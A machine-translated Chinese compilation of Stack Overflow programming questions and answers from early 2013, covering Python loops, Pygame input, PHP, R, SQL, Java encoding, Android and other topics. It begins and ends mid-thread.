这里有一个问题。

```
if(current->data > toFindNum)
    current = current->rightchild; 
```

考虑这棵树。

```
 5
 /  \
 4   6 
```

你`toFindNum`是 4。如果`current->data`是 5，大于 4，你需要看左孩子，而不是右孩子。

你的陈述应该是这样的。

```
if(current->data > toFindNum)
    current = current->leftchild;
else
current = current->rightchild; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:53:16.853

在`searchForItem`

```
if(current->data > toFindNum) 
```

那不应该是：

```
if (toFindNum > current->data) 
```

# python - 我的无限while循环有什么问题？

> ID：14111374
> 
> 赞同：0
> 
> 时间：2013-01-01T14:43:51.040
> 
> 标签：python, while-loop

这是我的代码：

```
#!/usr/bin/env python

encodec = {
    'a':22 , 'b':24 , 'c':26 , 'd':28 , 'e':12 , 'f':14 , 'g': 16 , 'h':18 , 'i':32 , 'j':34 , 'k':36 , 'l':38 , 'm':42 , 'n':44 , 'o':46 , 'p':48 , 'q':50 , 'r':52 , 's':54 , 't':56 , 'u':58 , 'v': 62 , 'w':64 , 'x':66, 'y': 68 , 'z':72 , ' ':74 , '.':76 , ',':78 , "'":82 , '?':84 , '"':86
}
decodec = {
    22:'a' , 24:'b' , 26:'c' , 28:'d' , 12:'e' , 14:'f' , 16:'g' , 18:'h' , 32:'i' , 34:'j' , 36:'k' , 38:'l' , 42:'m' , 44:'n' , 46:'o' , 48:'p' , 50:'q' , 52:'r' , 54:'s' , 56:'t' , 58:'u' , 62:'v' , 64:'w' , 66:'x', 68:'y' , 72:'z' , 74:' ' , 76:"." , 78:',' , 82:"'" , 84:'?' , 86:'"'
}
option = raw_input("Would you like to 'encode' or 'decode' a word? ")
while option.lower() not in ('encode' , 'decode'):
    option = raw_input("Please enter a valid response ('encode' or 'decode'): ")

if option.lower() == 'encode':
    word = raw_input("Enter a string to be encoded: ").lower()
    length = len(word)
    z = 1
    result = []
    while z < length+1:
        a = word[z-1]
        result += str(encodec[a])
        z = z + 1
    print int(''.join(result))

elif option.lower() == 'decode':
    num = (raw_input("Enter your text to be decoded: "))
    length = len(num)
    z = 1
    result = []
    while z < length+1:
        a = num[z-1:z+1]
        result += str(decodec[int(a)])
        z = z + 1
    print ''.join(result) 
```

这是不太有效的片段：

```
elif option.lower() == 'decode':
    num = (raw_input("Enter your text to be decoded: "))
    length = len(num)
    z = 1
    result = []
    while z < length+1:
        a = num[z-1:z+1]
        result += str(decodec[int(a)])
        z = z + 1
    print ''.join(result) 
```

我不明白为什么这个循环继续循环。循环的条件是当变量 z 的值小于长度的值时，继续循环。循环中的长度不会增加，我在循环中添加了一条线，每次迭代都会将 1 添加到 z 中。但是，出于某种原因，它继续无限循环。我不明白为什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T15:06:39.257

在我看来，空格的使用不一致。尝试使用运行您的代码

```
python -tt your_program_name.py 
```

确认这一点。如果我查看您发布的原始代码，第一个片段如下所示：

```
 "    elif option.lower() == 'decode':\n",
 '    \tnum = (raw_input("Enter your text to be decoded: "))\n',
 '    \tlength = len(num)\n',
 '    \tz = 1\n',
 '    \tresult = []\n',
 '    \twhile z < length+1:\n',
 '    \t\ta = num[z-1:z+1]\n',
 '    \t\tresult += str(decodec[int(a)])\n',
 '        \tz = z + 1\n',
 "        print ''.join(result)\n",
 '    \t\n', 
```

你可以看到`z = z + 1`线条的奇怪缩进。特别是，虽然您似乎使用制表符进行缩进，但该行只有一个制表符，所以即使它看起来在屏幕上正确缩进，我认为它实际上并没有被执行，因为它实际上不在`while`循环内.

始终使用四格制表符：让生活更轻松。大多数编辑器都可以配置为执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:00:16.930

这些代码在你那正常吗？

```
elif option.lower() == 'decode':
    num = (raw_input("Enter your text to be decoded: "))
    result = ''
    index = 0
    while index < len(num) -1:
        result += decodec[int(num[index:index +2])]
        index += 2
    print result 
```

如果我将输入设置为`222426`，则输出为`abc`

# lucene - 你如何从 lucene 文档中读取整数值？

> ID：14111377
> 
> 赞同：3
> 
> 时间：2013-01-01T14:44:04.677
> 
> 标签：lucene, lucene.net

我正在使用 lucene.net 并尝试了以下方法，但没有成功

```
NumericField myField = (NumericField)doc.GetFieldable("mynumber")
int val = (int)myField.NumericValue; 
```

任何想法如何读取/转换为 numericfield 或任何其他替代方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-02T00:07:54.720

NumericFields 仅在索引期间使用。对于文档检索，假设您已经存储了字段值，您应该从索引中检索文本值并将其转换为整数。

为新示例修改代码（未编译，但应该清楚）：

```
var myField = doc.GetFieldable("mynumber").StringValue();
var val = Int32.Parse(myField); 
```

要确保已存储数字字段，请使用 NumericField 构造函数，该构造函数允许您指定是否以及如何存储该字段。

# php - Yii 覆盖 createUrl 但保留参数

> ID：14111379
> 
> 赞同：1
> 
> 时间：2013-01-01T14:44:11.580
> 
> 标签：php, url-rewriting, yii, extend

我正在扩展和覆盖 createUrl 方法以制作漂亮的 URL。

这是一个片段：

```
public function createUrl($manager, $route, $params, $ampersand) {
        if($route == 'widget/view'){
            $widget = Widget::model()->findByPk($params['id']);
            return 'widget/' . $params['id'] . '/' . SEOUrlRule::slug($widget->title);
        }
} 
```

很多事情在这里都无关紧要。我删除了不相关的部分。

它工作正常。但是，有时可能会使用附加参数（例如锚标记或 GET 参数）调用该方法以放在 URL 的末尾。

使用我的方法，这些参数会丢失。要在新 URL 中传递它们，我是否必须重新执行原始 createUrl 方法手动执行的操作？或者有没有一种很好的面向对象的方式来将工作传递给一个称职的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T20:00:42.113

你已经提出了所有必要的论点——这是故意的吗？

您可以使用 CApplication 中的 createUrl 让 Yii 构造参数字符串，例如：

```
public function createUrl($manager, $route, $params, $ampersand) { 
        if($route == 'widget/view'){
            $widget = Widget::model()->findByPk($params['id']);
            $url = 'widget/' . $params['id'] . '/' . SEOUrlRule::slug($widget->title);
            return Yii::app()->createUrl(trim($url,'/'),$params,$ampersand);
        }
} 
```

# python - 如何在 Pygame 中获取用户的文本输入？

> ID：14111381
> 
> 赞同：5
> 
> 时间：2013-01-01T14:44:34.477
> 
> 标签：python, pygame

如何使用户的 pygame 打印输入：

我试图让用户输入一些东西，然后 pygame 将它打印在屏幕上。

这是我目前的程序：

```
import pygame, pygame.font, pygame.event, pygame.draw, string
from pygame.locals import *

def get_key():
  while 1:
    event = pygame.event.poll()
    if event.type == KEYDOWN:
      return event.key
    else:
      pass

def display_box(screen, message):
  "Print a message in a box in the middle of the screen"
  fontobject = pygame.font.Font(None,18)
  pygame.draw.rect(screen, (0,0,0),
                   ((screen.get_width() / 2) - 100,
                    (screen.get_height() / 2) - 10,
                    200,20), 0)
  pygame.draw.rect(screen, (255,255,255),
                   ((screen.get_width() / 2) - 102,
                    (screen.get_height() / 2) - 12,
                    204,24), 1)
  if len(message) != 0:
    screen.blit(fontobject.render(message, 1, (255,255,255)),
                ((screen.get_width() / 2) - 100, (screen.get_height() / 2) - 10))
  pygame.display.flip()

def ask(screen, question):
  "ask(screen, question) -> answer"
  pygame.font.init()
  current_string = []
  display_box(screen, question + ": " + string.join(current_string,""))
  while 1:
    inkey = get_key()
    if inkey == K_BACKSPACE:
      current_string = current_string[0:-1]
    elif inkey == K_RETURN:
      break
    elif inkey == K_MINUS:
      current_string.append("_")
    elif inkey <= 127:
      current_string.append(chr(inkey))
    display_box(screen, question + ": " + string.join(current_string,""))
  return string.join(current_string,"")

def main():
    screen = pygame.display.set_mode((320,240))
    print ask(screen, "Name") + " was entered"

if __name__ == '__main__': main() 
```

我想要它，所以当用户按 Enter 键时，它会清空屏幕。

帮我！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T17:04:06.773

这是一个将输入传送到屏幕的示例脚本。它展示了如何`name`在循环通过 pygame 事件队列时修改字符串。每一帧，屏幕被清除，名称表面被重建和blit。

```
import pygame
from pygame.locals import *

def name():
    pygame.init()
    screen = pygame.display.set_mode((480, 360))
    name = ""
    font = pygame.font.Font(None, 50)
    while True:
        for evt in pygame.event.get():
            if evt.type == KEYDOWN:
                if evt.unicode.isalpha():
                    name += evt.unicode
                elif evt.key == K_BACKSPACE:
                    name = name[:-1]
                elif evt.key == K_RETURN:
                    name = ""
            elif evt.type == QUIT:
                return
        screen.fill((0, 0, 0))
        block = font.render(name, True, (255, 255, 255))
        rect = block.get_rect()
        rect.center = screen.get_rect().center
        screen.blit(block, rect)
        pygame.display.flip()

if __name__ == "__main__":
    name()
    pygame.quit() 
```

这是一个[要点版本](https://gist.github.com/4428513)

# wpf - 等待 XAML 布局完成

> ID：14111384
> 
> 赞同：1
> 
> 时间：2013-01-01T14:45:00.580
> 
> 标签：wpf, xaml, asynchronous, windows-8

我正在对页面进行一些更改（通过添加/删除控件），并且我只想在布局确定后继续我的代码（测量和排列所有元素等）。

我该怎么做呢？是否有一些我可以等待的任务会在布局完成时触发？

（现在使用 Yields 和其他技巧，但它们都让我感到肮脏）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-03T03:40:48.793

您可以`Task`使用`TaskCompletionSource<T>`.

在您的情况下，听起来`UIElement.LayoutUpdated`可能是您想要的事件（对此并不完全确定 - WPF 布局细节不是我的强项）。

这是一个例子：

```
public static Task LayoutUpdatedAsync(this UIElement element)
{
  var tcs = new TaskCompletionSource<object>();
  EventHandler handler = (s, e) =>
  {
    element.LayoutUpdated -= handler;
    tcs.SetCompleted(null);
  };
  element.LayoutUpdated += handler;
  return tcs.Task;
} 
```

然后，您可以将此方法用于`await`该事件的下一个实例：

```
await myUiElement.LayoutUpdatedAsync(); 
```

# android - 制作动画时出现 NullPointerException

> ID：14111387
> 
> 赞同：0
> 
> 时间：2013-01-01T14:45:59.983
> 
> 标签：android, animation, nullpointerexception, android-viewpager, android-context

我的 android 应用程序中有一个非常烦人的问题，我就是不知道是什么问题。

我正在尝试制作这样的动画对象：

```
Animation anim = AnimationUtils.makeInChildBottomAnimation(Myclass.this); 
```

这是 LogCat：

```
01-01 15:25:37.730: E/AndroidRuntime(10277): FATAL EXCEPTION: main
01-01 15:25:37.730: E/AndroidRuntime(10277): java.lang.NullPointerException
01-01 15:25:37.730: E/AndroidRuntime(10277):    at android.content.ContextWrapper.getResources(ContextWrapper.java:81)
01-01 15:25:37.730: E/AndroidRuntime(10277):    at android.view.animation.AnimationUtils.loadAnimation(AnimationUtils.java:71)
01-01 15:25:37.730: E/AndroidRuntime(10277):    at android.view.animation.AnimationUtils.makeInChildBottomAnimation(AnimationUtils.java:253) 
```

我猜这与获取课程的上下文有关。我也尝试过从 xml 文件加载动画并制作 alhpa 动画，但我在这两个上都得到了 NPE。

我正在打电话`setContentView();`，`onCreate`所以我不明白为什么我会收到这个错误。在此类中，我声明 a`ViewPagerAdapter`并将其设置为`ViewPager`我的 xml 布局中的。在适配器类中，iam 检查`ImageView`在`ViewPager`. 当用户长按时，我会在出现错误的类中调用静态方法。静态方法又会生成一个调用非静态方法的新对象，如下所示：

```
 ViewPagerClass d = new ViewPagerClass();
    d.showMenu(); 
```

在该`showMenu`方法中，我尝试制作将淡入淡出的动画，`RelativeLayout`但这就是它失败的地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:19:37.247

根据您的评论，您似乎正在实例化`ViewPagerClass`一个`Activity`. 这是不正确的做法，因为`Activity`手动实例化的将没有有效的`Context`关联，并且在尝试使用该不存在时会出现异常`Context`。活动旨在由 Android 系统创建和管理。

> 当用户长按时，我会在出现错误的类中调用静态方法。静态方法又会生成一个调用非静态方法的新对象，如下所示：

不要这样做。如果`ViewPagerAdapter`和`ViewPagerClass`类位于不同的文件中，则修改`ViewPagerAdapter`构造函数，以便将`Context`引用传递给它（an `Activity`( `ViewPagerClass`) is a `Context`）并在创建实例时分配`this`或分配。然后，您将使用该引用在图像长按上调用该方法。`ViewPagerClass.this``ViewPagerAdapter``Context``ViewPagerAdapter``showMenu()`

# language-agnostic - 是否存在不可压缩的字符串？

> ID：14111388
> 
> 赞同：5
> 
> 时间：2013-01-01T14:46:25.850
> 
> 标签：language-agnostic, compression

我想知道是否有一个或多个不能无损压缩的字符串。更正式地说：

假设`String`是一个字符串，`f(var)`一个返回压缩版本的压缩函数`var`，`g(var)`一个解压缩函数，`g(f(var)) = var`以及`strlen(var)`一个返回长度的函数`var`，是否存在
有效值？`String``strlen(String) < strlen(f(String))``strlen(String) = strlen(f(String))`

欢迎理论答案，以及不同语言和不同压缩算法的示例。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-01T14:48:57.740

*[鸽巢原理](http://en.wikipedia.org/wiki/Pigeonhole_principle)*告诉我们，对于任何给定的压缩函数* ^，必须始终至少有一个输入字符串将被扩展。

* * *

[* 即真正压缩至少一个输入字符串的函数。]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T14:52:33.273

我希望这个字符串符合要求：“”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T18:48:25.140

是的，原因很简单：例如，一个保证返回无损压缩字符串的函数，对于任何输入字符串，该字符串至少会少一点。是否存在这样的函数，然后通过一次又一次地将相同的函数重新应用于其先前的结果，我们保证每次通过时至少进一步连续压缩任何字符串，因此，我们保证能够无损压缩任何任何长度的字符串，每次只有一位。

显然，这是错误的（一些初始字符串可能会给出这样的最终结果，并且很容易发现它们正在将解压缩算法应用于长度为一位的压缩字符串，但该结果不能扩展到所有未压缩的字符串），因此，这样的功能不可能存在；这意味着对于任何压缩算法，至少存在一个不可压缩的字符串。

# r - 在R中的IF语句中编写嵌套函数

> ID：14111390
> 
> 赞同：-3
> 
> 时间：2013-01-01T14:46:44.760
> 
> 标签：r

我有以下形式的功能：

```
a<-function(a,b,c){

if (a<0){ s<<-1;d<<-0; c
}
else { nest<-function(b,c){

if(b=0){ s<<-2; c}
else { 0
}
} 
```

有可能这样做吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T15:06:01.830

目前还不清楚您要做什么。如果`a<0`然后两个全局分配将发生并且函数将返回 的值`c`。否则（一旦更改`b=0`为`b==0`并添加足够的右括号）该函数将*不可见地*返回`nest`您定义的函数。它不会`s`全局设置，因为该函数`nest`只是被定义，而不是被调用。

```
a<-function(a,b,c) {
   if (a<0){ 
      s<<-1;d<<-0; c
   } else { 
     nest<-function(b,c){
       if(b==0){ s<<-2; c} else { 0 }
     }
   }
} 
```

第一种情况：

```
a(-1,1,1)
## [1] 1
s
## [1] 1
d
## [1] 0 
```

第二种情况：

```
x <- a(2,1,1)
x
## function(b,c){
##           if(b==0){ s<<-2; c} else { 0 }
##         }
## <environment: 0x998e634> 
```

您的意思似乎更有可能是：

```
a <- function(a,b,c) {
   if (a<0){ 
      s<<-1;d<<-0; c
   } else { 
       if (b==0) { s<<-2; c} else { 0 }
   }
} 
```

哪一个

*   if`a<0`将设置`s`和`d`全局并返回`c`
*   如果`a>0` *并且* `b==0`将`s`全局设置并返回`c`
*   如果`a>0` *并且* `b!=0`将只返回 0

顺便说一句，调用你的函数`a`并给它一个名为`a`.

因此，“我可以这样做吗？”的狭隘答案。是“是的，如果你修正你的语法”。广泛的答案是“我不确定你在做什么，你在做什么似乎不太明智。如果你能更清楚地表达你想要做什么的逻辑（即什么是不同输入的期望结果？）然后我们可以帮助您提出体现该逻辑的代码。”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T14:52:20.137

不确定您尝试做什么，但我假设您想要的函数根据变量 a、b 和 c 的值执行某些操作。您可以使用以下功能来做到这一点：

```
a <- function(a,b,c){
IF(a<0){
# do some stuff
}else{
# do some other stuff
} #close if statement
} #close function statement 
```

换句话说，在函数中使用 if 语句没有问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-01T14:57:17.827

可以有嵌套的`if`语句，

例如

```
myfun <- function(x){
                     if(x < 0){
 print("less") }else{
 if(x>7) {
 print("more") }else{
 print("middle")
         }
     }
 }

  myfun(-1)
[1] "less"
> myfun(8)
[1] "more"
 > myfun(6)
[1] "middle" 
```

但是在您的第二部分中，您说的是`if`条件然后命名一个函数，而不是调用该函数。显然，如果有选择，我不会使用像上面那样的函数，但我们可以做得更好。还要记住一个有用的工具来减少其中一些是`ifelse`

# php - 基于数组生成选中标记的复选框

> ID：14111402
> 
> 赞同：0
> 
> 时间：2013-01-01T14:49:26.573
> 
> 标签：php, forms

我有 6 个美国州（夏威夷、俄亥俄、路易斯安那、弗吉尼亚、田纳西和德克萨斯）。我还有另外 3 个美国州的数组，它们是从上述 6 个美国州（俄亥俄州、弗吉尼亚州、德克萨斯州）中选出的。

如何让 PHP 生成总共 6 个状态的复选框列表，但选中的状态被选中？我的代码在下面列出，我似乎无法让它运行：

```
<!DOCTYPE> 
<html>
<head>
    <style>
    #locationsBox { 
        border: 2px solid #ccc; 
        width: 250px; 
        height: 100px; 
        overflow-y: scroll; 
    }
    </style>
</head>
<body>
    <div id="locationsBox">
    <form name="location_checkboxes">
    <?
    $locations = array("Hawaii","Ohio","Louisiana","Virginia","Tennessee","Texas");
    $selected_locations = array("Ohio","Virginia","Texas");

    for($i = 0; $i < sizeOf($locations); $i++) {
        if (false != $key = array_search($selected_locations[$i],$locations) {
            echo '<input type="checkbox" checked="yes" value="'.$locations[$key].'" />' . $locations[$key] . '<br />';
        } else {
            echo '<input type="checkbox" value="'.$locations[$i].'" />' . $locations[$i] . '<br />';
        }
    }
    ?>
    </form>
    </div>
</body>
</html> 
```

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:55:44.463

```
<?php
$locations = array("Hawaii","Ohio","Louisiana","Virginia","Tennessee","Texas");
$selected_locations = array("Ohio","Virginia","Texas");
foreach($locations as $l)
{
    if(in_array($l,$selected_locations))
    {
       echo '<input type="checkbox" name="location[]"     checked="checked" value="'.$l.'" />' . $l . '<br />';
        echo "<br />";
    }
     else 
    {
        echo '<input type="checkbox" name="location[]" value="'.$l.'" />' . $l . '<br />';
    }
}
?> 
```

# java - 单机 Spring+Java+JMS

> ID：14111407
> 
> 赞同：0
> 
> 时间：2013-01-01T14:49:49.943
> 
> 标签：java, spring

我有两个启动脚本来运行独立的应用程序。

1.  `startQueue.sh`用于监听 JMS 消息并将消息存储到 Oracle 数据库表中。
2.  `startProcess.sh`- 获取表信息并处理数据并从数据库中删除信息并终止。

我的问题是 JMS 消息何时插入数据库然后使用计时器自动触发和处理表信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T19:03:37.897

您可以让第二个应用程序不断运行，轮询数据库，但我认为更好的设计是一步完成 - 接收 JMS 消息，插入它（如果需要），然后处理它，全部在一个应用程序。

# c++ - c++ - 如何将给定的字符串从输入拆分为不同类型的变量？

> ID：14111409
> 
> 赞同：-2
> 
> 时间：2013-01-01T14:50:07.023
> 
> 标签：c++

我希望能够得到一条线并将其拆分为不同类型的变量（使用标准 c++ 库）。所以这个输入行：

```
C 56 99.7 86.7 9000 
```

将按空格字符“爆炸”到这些变量：

```
Char
std:string
double
double
double 
```

这就是我目前处理给定输入的方式：

```
#define MAX_LINE 200

char line[MAX_LINE];
cout << "Enter the line: ";
cin.getline (line,MAX_LINE); 
```

是否有像`getline()`我这样的特殊功能可以用来分离给定的输入并将这些输入分配给变量（使用强制转换或类似方法）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:54:10.973

使用`>>`运算符得到你想要的

```
#include <iostream>

int main()
{
    char c;
    double d;
    std::cin >> c >> d;

    std::cout << "The char was: " << c << ", the double was:" << d;    
} 
```

[你可以在这里](http://www.cplusplus.com/reference/istream/istream/operator%3E%3E/)阅读更多关于它的信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:01:10.340

不要使用 getline()，而是使用 istream 运算符 >>。

这些是此运算符的重载：

```
// Member functions  :

istream& operator>> (bool& val );
istream& operator>> (short& val );
istream& operator>> (unsigned short& val );
istream& operator>> (int& val );
istream& operator>> (unsigned int& val );
istream& operator>> (long& val );
istream& operator>> (unsigned long& val );
istream& operator>> (float& val );
istream& operator>> (double& val );
istream& operator>> (long double& val );
istream& operator>> (void*& val );
istream& operator>> (streambuf* sb );
istream& operator>> (istream& ( *pf )(istream&));
istream& operator>> (ios& ( *pf )(ios&));
istream& operator>> (ios_base& ( *pf )(ios_base&));

// Global functions :
istream& operator>> (istream& is, char& ch );
istream& operator>> (istream& is, signed char& ch );
istream& operator>> (istream& is, unsigned char& ch );
istream& operator>> (istream& is, char* str );
istream& operator>> (istream& is, signed char* str );
istream& operator>> (istream& is, unsigned char* str );

char ch;
std:string str;
double d;

cin >> ch >> str >> d; 
```

# cakephp - 模型继承关系的 Cakephp 解决方法

> ID：14111411
> 
> 赞同：5
> 
> 时间：2013-01-01T14:50:14.257
> 
> 标签：cakephp

据我了解，`cakephp`不支持数据库继承关系。但是，我想创建一个具有不同类型用户的数据库。

在这种情况下，存在三种类型的用户：`Seller`、`Customer`和`Administrator`。每个用户都应该有基本的用户信息，例如`password`，`username`等。
但是，每种类型的用户都有自己独特的数据集。例如，卖家可能有inventory_id，而客户可能有delivery_address等。

我一直在考虑在不破坏`cakephp`约定的情况下为这个问题创建一个解决方法。我打算在 User 表中创建三个额外的外键 ,`admin_id`和`seller_id`，`customer_id`它们链接到其他表。但是，知道这是一种`IS-A`关系 not `HAS-A`，我必须确保其中两个 id 是 NULL 值。因此，这种解决方法对我来说似乎很难看..

还有其他更简单、更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:10:57.680

对于这种类型的数据库结构，我可能会考虑采用实体-属性-值模型。这意味着您的客户可能有一个delivery_address，您的用户可能有一个inventory_id，但就您在Cake 中的关系而言，您的用户和客户都只有一个attribute_id ...然后您可以创建另一个表来存储什么*类型*的属性可用。

这是最简单的形式，您的用户和客户将通过 hasMany（可能）关系附加到 *attribute_lookup* 或 *attribute_link* 表。该attribute_lookup/link 表将通过belongsTo/hasOne 关系连接到实际的属性类型和属性值模型。

如果您正确地规范化您的表格，您可以很好地遵守 Cake 关系约定。

[您可以在此处](http://en.wikipedia.org/wiki/Entity%E2%80%93attribute%E2%80%93value_model)阅读有关 EAV的更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-24T09:38:26.747

我已经考虑这个问题一段时间了，我最终找到了一个解决方案。我想出的是一个可以在 CakePHP 之上使用的新 ORM。

它有点像 CakePHP 3.0 的工作方式，带有表示 id/model 的实体，但它更高级，支持多表继承和单表继承。

看看：[https ://github.com/erobwen/Cream](https://github.com/erobwen/Cream)

# mysql - 选择具有相同id的下一条记录

> ID：14111414
> 
> 赞同：0
> 
> 时间：2013-01-01T14:50:47.343
> 
> 标签：mysql, sql, duplicates

我有一个示例表，其中包含以下行的答案。id 可能是重复的，因为它与基于 id 的问题表连接（即一个问题可能有多个答案）

```
answers.id | answers.username | answer | date
   1       |       mikha      | you    | 2013-01-01 00:00:00   
   1       |     maricela     | really | 2013-01-01 00:00:00 
   1       |        guy       | rock   | 2013-01-01 00:00:00 
```

是否有一个查询可以用来选择“maricela”回答后的所有行？

类似于：

```
SELECT * FROM answers WHERE id = 1 AND answers.username > 'maricela' 
```

但是上面将返回 0 行，因为上面的操作将按字母顺序选择，而按字母顺序的人在 maricela 之前。

有什么方法可以逐行选择具有值的行吗？排在`ID=1`和`USERNAME=mariclea`之后

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:56:29.503

我**强烈**建议你在你的答案表中添加一个唯一的 id，并有一个用于加入问题表的新列：

```
question_id |  id | username | answer | date
    1       |   1 | mikha    | you    | 2013-01-01 00:00:00   
    1       |   2 | maricela | really | 2013-01-01 00:00:00 
    1       |   3 | guy      | rock   | 2013-01-01 00:00:00 
```

然后你可以使用：

```
SELECT * FROM answers WHERE id > (
    SELECT id FROM answer WHERE username = 'maricela' and question_id = 1
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:55:47.360

我突然想到了一些事情：如果您的“之后”概念与时间相关（即在“maricela”之后插入的答案），那么您可以考虑为答案表添加日期/时间列。这样，您将确保某些答案比其他答案晚

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:02:03.117

这将简单地做到，

```
SELECT b.* FROM table1 b WHERE b.id> 
(SELECT a.id FROM table1 a WHERE a.username='maricela'
and a.answer_id=1) 
```

[**实时 SQL 演示**](http://sqlfiddle.com/#!2/2e17f/7)

# python - Scipy.优化 Python

> ID：14111417
> 
> 赞同：0
> 
> 时间：2013-01-01T14:51:13.897
> 
> 标签：python, optimization, scipy

我正在尝试优化我建立的模型的参数。它是一个非常简单的基于预测山区径流的模型。大学课程的一部分：

```
def model(params, snowProportion,temperature):
    '''
    Calculates predicted runoff.
    '''
    K = params[0]
    p = params[1]
    tempThresh = params[2]
    meltDays = np.where(temperature > tempThresh)[0]
    accum = snowProportion*0.
    for d in meltDays:
        water = K * snowProportion[d]
        n = np.arange(len(snowProportion)) - d
        m = p ** n
        m[np.where(n<0)]=0
        accum += m * water
    np.savetxt('2005predicted.dat', accum)

params = [2000, 0.96, 9] 
```

有人告诉我使用 scipy.optimize.fmin_cg;

所以我想我会按照以下方式做一些事情：

```
x = scipy.optimize.fmin_cg(model, params, args=[snowProportion, temperature]) 
```

我不断收到以下错误：

```
TypeError: 'numpy.ndarray' object is not callable 
```

所以我认为我需要它们在列表中 - 但我遇到了同样的问题：

```
TypeError: 'list' object is not callable 
```

我想更好地估计参数。雪比例和温度的形状为 (365,)

均方根误差：

将 numpy 导入为 np 导入 scipy.optimize

```
def RMSE(params,temperature, snowProportion):
    '''
    Calculates the RMSE of a model from measured and predicted.
    '''
    measured = np.loadtxt('/home/david/Documents/HydroM/runoff2005.dat')
    K = params[0]
    p = params[1]
    tempThresh = params[2]
    meltDays = np.where(temperature > tempThresh)[0]
    predicted = snowProportion*0.
    for d in meltDays:
        water = K * snowProportion[d]
        n = np.arange(len(snowProportion)) - d
        m = p ** n
        m[np.where(n<0)]=0
        predicted += m * water
    err = np.sqrt((measured - predicted) ** 2).mean()
    return err 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:31:22.467

[scipy.optimize.fmin_cg](http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.fmin_cg.html#scipy.optimize.fmin_cg)的第一个参数——在你的代码中命名`model`——应该代表你想要最小化的函数（**大概是你的模型估计的误差与给定的一组参数相比一些参考值**......）。
具体来说，它应该是一个**返回标量值**的函数。
算法需要知道模型在给定参数集下的表现有多好。

# java - 读入文件时显示字符 - 编码

> ID：14111419
> 
> 赞同：0
> 
> 时间：2013-01-01T14:52:08.577
> 
> 标签：java, swing, file, character-encoding

当我将文本显示到我的文本区域时，我遇到了文本编码问题。

问题是当有这样的字符时：`é à è`

我在我的文本区域中`? ? ?`有

这是读取我的文件的代码部分：

```
private void importerActionPerformed(java.awt.event.ActionEvent evt) {                                         
    jTabbedPane1.setSelectedIndex(0);
    try {

        JFileChooser explorer = new JFileChooser(chemin);
        int answer = explorer.showOpenDialog(this);
        if (answer == JFileChooser.APPROVE_OPTION) {
            chemin = explorer.getCurrentDirectory().getAbsolutePath();

             String name = explorer.getSelectedFile().getCanonicalPath();
            System.out.println("name : "+name);

             texte.setText("");
             File file = new File(name);
             try {
             DataInputStream in = new DataInputStream(new FileInputStream(file));
             String result = in.readUTF();
             texte.setText(result);
             in.close();
             System.out.println("Erreur la");
             } catch (IOException e) {
             DataInputStream in = new DataInputStream(new FileInputStream(file));
             String result = null;
             result = "";
             byte[] buff = new byte[2048];
             int read = in.read(buff, 0, 2048);
             while (read >= 0) {
             String substr = new String(buff, 0, read);
             result += substr;
             read = in.read(buff, 0, 2048);
             }
             // System.out.println(result);
             Charset charset = Charset.forName("UTF-8");
             result = charset.decode(charset.encode(result)).toString();
             texte.setText(result);
             in.close();
             //System.out.println("Erreur la2");
             }              
        }
    } catch (Exception err) {
        JOptionPane.showMessageDialog(this, "Erreur lors du chargement du fichier", "Error", JOptionPane.WARNING_MESSAGE);
    }
} 
```

我的文本区域是：`texte.setText(result);`

你有什么主意吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:00:23.183

如果您的文件编码是 UTF-8，那么只需像[这里一样阅读它](https://stackoverflow.com/a/5868528/1360074)

```
BufferedReader br = new BufferedReader(new FileReader(file));
String line;
while ((line = br.readLine()) != null) {
  result += line;
}
br.close();

texte.setText(result); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:04:50.070

Charset.encode 方法需要一个 unicode 格式的字符串。事实上，java 中的所有字符串都应该是 unicode（utf16）。做这个

```
String substr = new String(buff, 0, read, "UTF-8"); 
```

并删除所有 charset.encode/decode 代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:06:25.330

你的线路`String substr = new String(buff, 0, read);`应该是

```
String substr = new String(buff, 0, read,"UTF-8"); 
```

构造`String(byte[] bytes, int offset, int length)`函数通过使用平台的默认字符集解码指定的字节子数组来构造一个新的字符串。

# java - Spring AOP 不会拦截 Spring 容器中的方法

> ID：14111422
> 
> 赞同：4
> 
> 时间：2013-01-01T14:52:34.423
> 
> 标签：java, spring, aop

我是 Spring AOP 的新手。
使用基于注解的 Spring 配置：

```
@Configuration
@EnableAspectJAutoProxy(proxyTargetClass=true)
@ComponentScan({"sk.lkrnac"}) 
```

方面：

```
@Aspect
@Component
public class TestAspect {
    @Before("execution(* *(..))")
    public void logJoinPoint(JoinPoint joinPoint){
        ....
    }

} 
```

弹簧组件：

```
package sk.lkrnac.testaop;

@Component
public class TestComponent{
    @PostConstruct
    public void init(){
